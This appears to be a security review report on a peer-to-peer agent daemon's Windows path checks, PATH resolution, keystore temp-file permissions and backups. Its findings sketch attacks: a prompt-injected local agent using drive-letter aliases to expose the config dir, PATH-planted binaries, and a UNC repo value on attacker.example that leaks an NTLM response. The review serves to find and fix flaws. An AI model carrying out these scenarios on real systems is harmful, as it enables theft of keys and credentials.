# T4: Filesystem paths, permissions, temp files, process execution

Reviewer: TH-T4 · model claude-opus-5-5 · elapsed ~95 min active (~240 min wall, including a usage-limit pause) · commit 6cc26a7

## Summary

| Critical | High | Medium | Low | Info |
|---|---|---|---|---|
| 0 | 0 | 1 | 3 | 2 |

The file and process layers are mostly sound. Secrets are written through one helper
(`keystore.WriteOwnerOnly`: temp file in the same dir, restricted before any byte, fsync,
rename). Every child process runs without a shell and gets fixed argv. Peer text reaches a
child only as argv elements or through the environment, never as options or script source.
The device runner and git serving have minimal environments. The weak spot across the
codebase is Windows path identity. The daemon compares **spellings** where it should compare
**files**, and the chunk reports already record most of the ways this goes wrong: C11-04
(`\\?\`/UNC), C11-02 (junctions at issuance), C14-01 (junctions at run time) and C16-05
(pipe name per spelling).

T4-01 adds evidence that bears on how C11-04 gets fixed. A `subst` drive letter or a mapped
network drive also bypasses the config-dir refusal, and so does the `\\?\Volume{GUID}` form.
A fix that only refuses `\\?\`/`\\.\`/UNC prefixes (the first option in C11-04's fix
direction) would leave the drive-letter forms open. Only the file-identity comparison closes
them all. The other new items are hardening:
- fixed Windows tools (`powershell.exe` for ordinary toasts, `schtasks.exe`) are still found
  through `PATH`;
- on Windows, the keystore DACL is set only after the temp file is created;
- device scopes are a second, narrower route into C11-03/C11-04;
- two Info notes.

## Questions (04-themes.md T4 method)

1. **File inventory.** See the table in §Inventory A. Every secret file goes through
   `WriteOwnerOnly` (`internal/keystore/file.go:54-80`):
   - Unix: `CreateTemp` is 0600, and `chmod` runs before `Write`.
   - Windows: a protected owner-only DACL is set before `Write`, but after the handle is
     opened (T4-03).
   - Atomic by rename in the same dir, with no directory fsync (C05-06).
   - Symlinks: a symlink at the final component is replaced by the rename, never followed.

   Other writers:
   - The config dir is 0700 on Unix and re-`chmod`ed on every start (`internal/paths/paths.go:56-66`).
     Windows sets no DACL (C16-08).
   - The IPC socket is created under umask 0177 (`internal/ipc/transport_unix.go:28-30`).
   - The log is 0600 (`internal/logfile/logfile.go:40`).
   - The CLI `--out` files go through `writeFileAtomic` (`cmd/agentnet/fetch.go:243-263`).

   Gaps already recorded: O-179, C26-01, C02-03/04, C16-03, O-183.
2. **Process inventory.** See §Inventory B.
   - No shell anywhere. The one path that runs peer-influenced content (git) takes a
     validated path after `--`, and `GIT_*` is scrubbed.
   - Scope programs are absolute, ownership-checked (D24) and run with `MinimalEnv`
     (`internal/device/runner.go:33-58`, `:116-119`). The process tree is killed through a
     Job object (Windows) or a process group (Unix); known gaps are O-156 and O-159.
   - Program resolution:
     - The approval window uses fixed absolute paths: `GetSystemDirectory` (Windows), the
       root-owned candidate list (Linux), `/usr/bin/osascript` (macOS).
     - `powershell.exe` for ordinary toasts and the approval toast, `schtasks.exe`, and on
       Unix `gdbus`/`notify-send`/`launchctl`/`systemctl` are found through `PATH`
       (C12-03 for the approval toast; T4-02 for the rest).
     - git is resolved once at start through `PATH`, since it has no fixed location; Go's
       `ErrDot` refuses the current directory (`internal/capability/git.go:67-82`).
3. **Windows specifics.**
   - Named pipe: an owner-SID DACL, but the name is squattable (C16-01) and depends on the
     spelling of the config dir (C16-05).
   - Created dirs have no DACL (C16-08).
   - Junctions: refused inside a served tree (`internal/capability/fs.go:167`). They are not
     detected at the resource root (C11-02) or in the repo re-check (C14-01). The program
     walk handles them and fails closed (O-162).
   - 8.3 names, trailing dot or space, `::$INDEX_ALLOCATION` and `:$I30:$INDEX_ALLOCATION`
     spellings of the config dir are **refused** at issuance (tested, T4-01 test log).
   - `\\?\`, `\\?\Volume{GUID}`, UNC and `subst`/mapped drive letters are **accepted**
     (C11-04, T4-01).
   - Reserved names and ADS in a peer's scope or path are rejected by `ValidScopePath`
     (C09 Q1; O-126 residual `COM0`/`LPT0`).
4. **Shell scripts.**
   - `scripts/install.sh`: `set -eu`, `mktemp -d` with a `trap` cleanup, only regular files
     taken from the tar. The predictable `.new.$$` name is O-183.
   - `deploy/early/setup.sh`: `set -euo pipefail`; `put()` writes to a `.tmp` and then `mv`,
     in root-owned dirs.
   - `packaging/homebrew/render.sh`: `set -eu`; `BASE_URL` is filtered for `sed`
     metacharacters.
   - Harness scripts: the fixed `/tmp/agentnet-stderr.$$` name is C30-05; everything else
     uses `mktemp -d`.

## Findings

### T4-01 · Medium · confirmed-test
- **Where:** `internal/daemon/grant.go:140-157` (`validateResource`: `EvalSymlinks` + `foldPath`
  spelling compare), `grant.go:173-179`; served by `internal/capability/fs.go:231` (`os.OpenRoot`)
- **What goes wrong:** Windows drive-letter aliases also pass the config-dir refusal:
  - a `subst` drive (`Q:\dorylinae` for `…\Roaming\dorylinae`);
  - by the same mechanism, a mapped network drive (`Z:` → `\\localhost\C$` or a
    folder-redirection share);
  - the volume-GUID path `\\?\Volume{…}\Users\…\dorylinae`.

  `EvalSymlinks` keeps the drive letter, so the cleaned, lowercased strings differ, and
  `filepath.Rel` fails across volumes. None of these forms is a UNC or `\\.\` prefix, so a
  C11-04 fix that only refuses prefixes leaves them open.
- **Scenario:** The owner has a `subst` drive, as HANDOFF §0 prescribes for the test
  workaround, or a mapped drive over their profile. A prompt-injected local agent with an open
  requester session calls `grant_create` with `resource = Q:\dorylinae` (or the volume-GUID
  form, which needs no mapping at all). The window shows "fs.read on dorylinae-xxxx to bob".
  Once the human approves, the peer reads `dorylinae.db` (and key files with the file
  keystore). Test: `TestReview55T401Subst`, `Q:\dorylinae-config ACCEPTED …
  data="SECRET-DB"`; `TestReview55T401Spellings`, `volume_guid ACCEPTED … data="SECRET-DB"`.
- **Spec:** `Docs/protocol/grant.md` §Issuance step 3, "Refused: the config dir … or any path inside it or containing it".
- **Fix direction:** Compare by file identity: open the resource and walk its ancestors
  comparing with `os.SameFile` against the config dir and home, or normalise with
  `GetFinalPathNameByHandle(VOLUME_NAME_GUID)` on both sides. Do not rely on a prefix denylist.
- **Related:** extends C11-04 (same root cause, new spellings; argues for its second fix option); C11-02; C16-05

### T4-02 · Low · confirmed-read
- **Where:** `internal/notify/desktop_windows.go:47` (`run(ctx, "powershell.exe", …)`),
  `internal/notify/desktop.go:34` (`exec.CommandContext(ctx, name, …)` → `LookPath`),
  `internal/service/schtasks.go:37-51`, `internal/service/service.go:119`, `cmd/agentnet/doctor.go:512,518`
- **What goes wrong:** Two fixed System32 tools are resolved through `PATH`. The toast for
  every ordinary notification starts `powershell.exe`, and `agentnetd install`/`uninstall`
  and `agentnet doctor` start `schtasks.exe`. This is the same pattern that approval.md
  §The approval window forbids for the approval dialog, and that C12-03 records for the
  approval toast. The toast's environment carries peer titles and bodies. `schtasks /Create`
  registers the logon task.
- **Scenario:** A directory ahead of System32 in the system `PATH` is writable by another
  local user. Examples are a tool directory under `C:\` that an installer added, which
  inherits `Authenticated Users:(M)` as on this PC (C13 Leads). That user plants
  `powershell.exe` or `schtasks.exe`. It then runs as the victim at the next notification
  (daemon identity, keys, DB) or at `agentnetd install`. This needs a misconfigured
  machine-wide `PATH`, so it is Low (rubric §2).
- **Spec:** approval.md §The approval window, "Fixed program … never from `PATH`" (dialog and
  approval toast). notify.md §Desktop and agentnetd-install.md say nothing about this.
- **Fix direction:** Resolve `powershell.exe` and `schtasks.exe` under `GetSystemDirectory()`,
  as `powershellPath()` does (`internal/notify/window_windows.go:93`).
- **Related:** C12-03, C12 Leads (`desktop.go:33`), R29 L2

### T4-03 · Low · confirmed-read
- **Where:** `internal/keystore/file.go:55-66` (`CreateTemp` then `restrictToOwner`),
  `internal/keystore/perm_windows.go:14-30`
- **What goes wrong:** On Windows the temp file is created with the parent's inherited ACL,
  and the owner-only DACL replaces it only afterwards. A handle that another principal opened
  in that window keeps the access it was granted at open time, and it can read the secret
  written next (identity seed, mailbox keys, `webhook.key`). The code comment "Restrict
  before any secret byte is written" is true only for access checks at open.
- **Scenario:** The config dir sits under a parent that another local user can read, for
  example `--home D:\agentnet` (C16-08; `doctor` warns). That user polls the dir for
  `.secret-*.tmp` and opens each new file for read. When the mailbox key rotates (hourly
  check, weekly key) or on first start, the user reads the X25519 private key or the Ed25519
  seed. This needs the owner's choice of home, so it is Low. The default `%APPDATA%` is
  private.
- **Spec:** rubric T4 method "permissions are applied before any secret byte"; ipc.md/keystore
  owner-only files.
- **Fix direction:** Create the file with a security descriptor: `windows.CreateFile` with
  `SECURITY_ATTRIBUTES` holding the owner-only DACL, and share mode 0 until it is written.
- **Related:** C16-08, O-030, C05-06

### T4-04 · Low · confirmed-read
- **Where:** `internal/daemon/device_scope.go:134-141` (`scopeResolver` → `validateResource`),
  `internal/device/scope.go:316-340` (`resolveProgram` → `exec.LookPath` on an absolute argv[0]),
  `internal/device/perm.go:52-56` (`EvalSymlinks`/`GetNamedSecurityInfo`)
- **What goes wrong:** `device_scope_set` resolves every repo and every absolute `argv[0]` on
  disk at set time, before any approval exists. A UNC value (`\\host\share\x`,
  `\\host\share\t.exe`) therefore makes the daemon open an SMB session to a host the caller
  chose. The C11-04/T4-01 spellings of the config dir are accepted as repos too.
- **Scenario:** A local agent on a helper device with an active link calls `device_scope_set`
  with `repo: "\\\\attacker.example\\s\\r"`. The daemon's logon session sends a Net-NTLMv2
  response before any human is involved. This is a second entry point to C11-03. It is
  narrower, because it needs an active helper link, while `grant_policy_add` needs only one
  paired peer. The config-dir-as-repo half is weak: the summary shows the full path through
  `DisplayQuote` (`device_scope.go:153`), and scoped programs are human-approved.
- **Spec:** approval.md threat model (a local agent may not make the daemon act before approval); device.md §Scope.
- **Fix direction:** The same fix as C11-03 in the shared `validateResource`, plus refuse UNC
  or device-namespace `argv[0]` before `LookPath`.
- **Related:** C11-03, C11-04, O-161, verify/C11-04 Leads

### T4-05 · Info · suspected
- **Where:** `internal/daemon/grant.go:252-275` (`isGitTopLevel`)
- **What goes wrong:** The issuance-time `git -C <resource> rev-parse` runs via `GitCommand`
  without `gitHardening()` and without `GIT_CEILING_DIRECTORIES`, unlike serving
  (`internal/capability/git.go:207-216`). It runs on any caller-chosen directory before
  approval. `rev-parse --show-toplevel`/`--absolute-git-dir` refreshes no index and runs no
  hooks, and I found no config that executes code for it, so this is not shown exploitable.
  Discovery can walk above the resource, but the `sameDir` check refuses the result.
  `validateGitResource` also does not apply the D23 version floor (`lookupGit` is `LookGit`,
  not `NewGitBackend`); serving refuses old git anyway.
- **Scenario:** none constructed.
- **Spec:** grant.md §Serving git (hardening is stated for served commands).
- **Fix direction:** Build issuance commands with the same `-c` hardening and ceiling as `GitBackend.command`.
- **Related:** O-151, C11-03

### T4-06 · Info · confirmed-read
- **Where:** `internal/relay/backup.go:37-45`
- **What goes wrong:** `VACUUM INTO` creates the unencrypted backup with SQLite's default mode
  (0644 minus umask), and the file becomes 0600 only after the copy finishes. The spec says
  the copy "is written with mode 0600". This is safe in the deployed setup: the DB dir is
  `StateDirectoryMode=0700` with `UMask=0077` (`deploy/early/agentnet-relay.service:38-41`),
  and `MkdirAll(…, 0o700)` covers a new dir. It is not safe for an `--out` in an existing
  shared dir run by an operator shell with umask 022, where another host user can open it
  during the copy.
- **Scenario:** Operator runs `relay backup --out /var/backups/relay.db`; another user of the
  relay host reads account emails and bindings while the copy runs. The operator chose the
  path, so this is Info.
- **Spec:** relay-hosted.md §3 Backup, "On the host … written with mode 0600 in the database's directory".
- **Fix direction:** Set umask 0077 around `VACUUM INTO`, or refuse an `--out` outside the DB dir.
- **Related:** C02-03, C02-04

## Checked and fine
- 8.3 short names, trailing dot or space, `::$INDEX_ALLOCATION` and `:$I30:$INDEX_ALLOCATION`
  spellings of the config dir are refused (`TestReview55T401Spellings` log):
  `EvalSymlinks` normalises the long name, and the ADS forms fail `EvalSymlinks`.
- A peer never names a local file. Mailbox key paths use own key_ids only. Served paths go
  through `ValidScopePath` + `os.Root`. Fetch `--out` is the user's own argument
  (`cmd/agentnet/fetch.go`).
- No `exec` through a shell anywhere in `cmd`, `internal` or `tools`. Every `CommandContext`
  has a timeout or the daemon's context.
- No daemon secret sits in the environment passed to children. The daemon reads only
  `DORYLINAE_*`, `XDG_CONFIG_HOME` and `DISPLAY` (grep of `Getenv`/`LookupEnv`).
- The Unix socket umask window is process-wide, but it only makes concurrent creates *more*
  restrictive (`transport_unix.go:28-30`).
- `releasesign keygen` uses `O_EXCL` 0600. Signature files are 0644 public. `embed` writes a
  0755 script (owner tool; O-184 is the Windows note).
- O-183, O-030, O-161, O-162 and O-203 are still present as recorded.
